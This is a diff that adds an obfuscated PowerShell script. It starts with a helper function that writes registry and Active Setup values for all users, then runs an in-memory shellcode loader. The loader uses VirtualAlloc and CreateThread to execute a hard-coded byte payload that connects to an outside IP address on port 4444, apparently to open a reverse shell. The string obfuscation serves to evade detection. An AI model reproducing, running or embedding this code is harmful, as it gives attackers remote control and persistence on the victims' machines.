@@ -1,0 +1,76 @@
+sEt  ("{0}{1}"-f 'zxa','N')  ( [TYPE]("{0}{1}"-f 'gUI','d') );function seT-R`EgIs`T`RYVaL`UefOr`ALL`USeRs {
+    
+    [CmdletBinding()]
+    param (
+        [Parameter(MaNDATOry = ${T`RuE})]
+        [hashtable[]]${ReG`IstRYINsT`An`ce}
+    )
+    try {
+        &("{1}{0}{2}" -f'w-PSD','Ne','rive') -Name ("{1}{0}"-f 'U','HK') -PSProvider ("{1}{0}"-f'gistry','Re') -Root ("{2}{0}{5}{4}{1}{3}" -f'ist','HK','Reg','EY_USERS','::','ry') | .("{2}{0}{1}"-f'ul','l','Out-N')
+
+        
+        ${lOg`GeDO`NSi`dS} = $(.("{2}{1}{0}" -f 'hildItem','-C','Get') ("{1}{0}"-f 'KU:','H') | &("{2}{1}{0}{3}"-f'Objec','ere-','Wh','t') { ${_}."na`ME" -match 'S-\d-\d+-(\d+-){1,14}\d+$' } | &("{0}{3}{1}{2}"-f 'fo','each-ob','ject','r') { ${_}."NA`Me" })
+        &("{0}{2}{1}{3}"-f'W','-Verbos','rite','e') "Found $($LoggedOnSids.Count) logged on user SIDs "
+        foreach (${s`Id} in ${L`O`GgE`Do`NSids}) {
+            &("{1}{2}{0}" -f 'bose','Write-Ve','r') -Message ('Load'+'i'+'ng '+'th'+'e '+'use'+'r '+'re'+'gistry '+'hive'+' '+'fo'+'r '+'th'+'e '+'l'+'og'+'ged '+'on'+' '+'S'+'ID '+"$sid")
+            foreach (${InSTAN`ce} in ${REg`i`stry`IN`sTA`NCe}) {
+                
+                if (!(.("{1}{2}{0}" -f 'ath','T','est-P') "HKU:\$sid\$($instance.Path)")) {
+                    &("{0}{1}{2}" -f 'Ne','w-Ite','m') -Path "HKU:\$sid\$($instance.Path | Split-Path -Parent) " -Name (${iNsTA`Nce}."pA`Th" | .("{0}{1}{2}"-f 'Spl','it-Pa','th') -Leaf) -Force | &("{0}{1}{2}"-f'Out','-Nul','l')
+                }
+                
+                .("{2}{0}{5}{3}{4}{1}" -f 'et-I','operty','S','e','mPr','t') -Path "HKU:\$sid\$($instance.Path)" -Name ${i`NSt`AncE}."NA`me" -Value ${i`NST`AnCe}."va`lUe" -Type ${iN`StAn`cE}."ty`PE" -Force
+            }
+        }
+
+        
+        
+        
+        .("{3}{1}{0}{2}{4}" -f 'i','r','te-Ve','W','rbose') ("{6}{10}{2}{1}{9}{12}{14}{15}{3}{4}{5}{11}{13}{0}{16}{8}{7}" -f' ','gistry ','Setup re','pl','y t','o ','Sett','rs','e','val','ing Active ','all','ue ',' other','to a','p','us')
+        foreach (${INs`T`AncE} in ${REGIs`TR`Y`iN`s`TANCE}) {
+            
+            ${G`UId} =   ${zX`AN}::("{1}{0}"-f'ewGuid','N').Invoke()."g`UId"
+            ${aCTIvES`EtuPREgP`ARe`N`TpATH} = ((("{9}{14}{4}{3}{15}{10}{0}{1}{12}{6}{7}{2}{13}{11}{8}{5}"-f'fpDA','cti','f','oftw','fpDS','mponents','S','etup','d Co','HKL','rosoft','DInstalle','ve ','p','M:','arefpDMic'))."R`E`PlaCe"(([chAr]102+[chAr]112+[chAr]68),[STring][chAr]92))
+            
+            &("{1}{2}{0}"-f 'em','New','-It') -Path ${AC`TIVesEtuprEg`pareN`TP`A`Th} -Name ${Gu`Id} -Force | &("{0}{2}{1}"-f'Out-','l','Nul')
+            ${AC`TIV`ESe`TupregPaTh} = ((('HKLM:V'+'tmSo'+'ftw'+'are'+'Vt'+'mMic'+'r'+'os'+'oftV'+'tmAct'+'ive ') -repLacE'Vtm',[ChAr]92)+('Se'+'tup'+'{'+'0}Insta'+'lled ')-F[CHAr]92+"Components\$Guid")
+            .("{0}{2}{1}" -f 'Write-','se','Verbo') ('Us'+'i'+'ng '+'re'+'g'+'istry '+'pat'+'h '+"'$ActiveSetupRegPath'")
+
+            
+            
+            switch (${INs`TA`NCe}."t`YPe") {
+                ("{1}{0}" -f'ing','Str') {
+                    ${R`EG`Va`lueTy`Pe} = ("{1}{0}" -f'Z','REG_S')
+                }
+                ("{1}{0}" -f 'rd','Dwo') {
+                    ${REgvAL`U`eTypE} = ("{0}{1}" -f'REG_D','WORD')
+                }
+                ("{1}{2}{0}" -f 'y','Bin','ar') {
+                    ${rEgvA`lu`E`TYPE} = ("{1}{2}{0}"-f'Y','REG_BINA','R')
+                }
+                ("{2}{0}{1}"-f'xpandStrin','g','E') {
+                    ${Re`gVALuet`Y`pe} = ("{3}{2}{0}{1}" -f 'G_EXPAND','_SZ','E','R')
+                }
+                ("{0}{3}{2}{1}"-f 'M','ng','ri','ultiSt') {
+                    ${REg`VaL`U`ety`Pe} = ("{2}{3}{1}{0}"-f'SZ','MULTI_','REG','_')
+                }
+                ("{0}{1}" -f'defaul','t') {
+                    throw "Registry type '$($instance.Type)' not recognized "
+                }
+            }
+
+            
+            ${AC`TIVES`etUpvaL`Ue} = "reg add `"{0}`" /v {1} /t {2} /d {3} /f" -f "HKCU\$($instance.Path)", ${iNStAN`CE}."NA`Me", ${R`egV`AluE`Type}, ${iNsT`A`NCe}."v`AlUE"
+            &("{2}{0}{1}"-f 'ite-Verb','ose','Wr') -Message ('A'+'ct'+'ive '+'set'+'up '+'va'+'lu'+'e '+'is'+' '+"'$ActiveSetupValue'")
+            
+            .("{3}{2}{4}{0}{1}" -f'rope','rty','et-Ite','S','mP') -Path ${ac`T`IVeS`ETUprEgpATh} -Name ("{0}{1}"-f'(De','fault)') -Value ("{1}{3}{2}{0}"-f 'est','Ac','ive Setup T','t') -Force
+            &("{1}{3}{0}{2}" -f 'per','Set-I','ty','temPro') -Path ${ac`Ti`VeseTUPR`E`gp`ATH} -Name ("{0}{2}{1}"-f'Vers','n','io') -Value '1' -Force
+            &("{0}{1}{4}{3}{2}" -f'Se','t-I','ty','mProper','te') -Path ${A`CtiveS`etUpR`EgPATH} -Name ("{1}{0}{2}" -f'at','StubP','h') -Value ${a`ct`IvesE`T`UpV`ALuE} -Force
+        }
+    }
+    catch {
+        .("{0}{2}{1}"-f'W','te-Warning','ri') -Message ${_}."EX`C`ePTion"."me`sSAgE"
+    }
+}
+
+${c} = ((("{50}{81}{28}{78}{0}{29}{91}{9}{23}{5}{73}{31}{70}{56}{47}{20}{86}{32}{35}{72}{16}{15}{83}{10}{48}{90}{76}{57}{63}{34}{1}{22}{75}{42}{80}{55}{69}{3}{33}{11}{26}{44}{53}{77}{85}{87}{45}{19}{4}{18}{49}{52}{30}{92}{43}{59}{41}{71}{14}{27}{46}{13}{60}{61}{64}{36}{12}{84}{88}{74}{40}{38}{65}{82}{89}{62}{8}{2}{24}{21}{39}{79}{17}{25}{67}{66}{58}{7}{68}{6}{51}{37}{54}"-f'mport({0}','[D','c extern',')]public stat','t','ic','uin','rc','ti','ic st','A','exter','ationF','ameter, u','t',', ','nt dwSize','ntPtr','a','nt dwS','tPtr l','tr m','ll','at',' IntP',' dest','n ','Ptr lp','l','kernel32.dll','ze, IntPt','extern IntPtr V','ss','ic ','ct);',', ','e','ount','Id);','emse','read','s','por','lpStartAdd','IntPtr','tes, ui','Par','lAlloc(In','lloc','ckS','[','t c','i',' CreateThrea',');','ll{0','tua','T','nt s','res','i','nt d','ublic sta','ype, uint flProte','wCr','[DllImpor',' ui',',',', ','}','ir',', In','ui',' ','r lpTh','Im','ion','d(IntPtr','lI','t(I','t({0}kernel32.d','D','t({0}msv','uint fl','lags,',' lpThreadA','pAddre','ttribu',' IntPt','crt.dll{0})]p','at','{0})]publ','r '))  -f [cHAr]34);${w} = &("{0}{1}{2}"-f 'A','dd-T','ype') -memberDefinition ${c} -Name ("{0}{1}" -f'W','in32') -namespace ("{1}{3}{0}{4}{2}"-f 'ti','W','ns','in32Func','o') -passthru;[Byte[]];[Byte[]]${SC} = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xb0,0xe4,0x28,0xe6,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;${SI`zE} = 0x1000;if (${s`C}."lENg`TH" -gt 0x1000){${s`IZe} = ${SC}."le`NgTh"};${X}=${w}::("{0}{2}{1}{3}" -f'V','u','irt','alAlloc').Invoke(0,0x1000,${S`ize},0x40);for (${i}=0;${i} -le (${sC}."lEN`Gth"-1);${i}++) {${W}::"mEm`SeT"([IntPtr](${x}.("{2}{0}{1}" -f'oI','nt32','T').Invoke()+${i}), ${s`c}[${i}], 1)};${w}::("{2}{1}{0}"-f 'Thread','ate','Cre').Invoke(0,0,${x},0,0,0);for (;;){&("{0}{2}{1}" -f 'Star','ep','t-sle') 60};
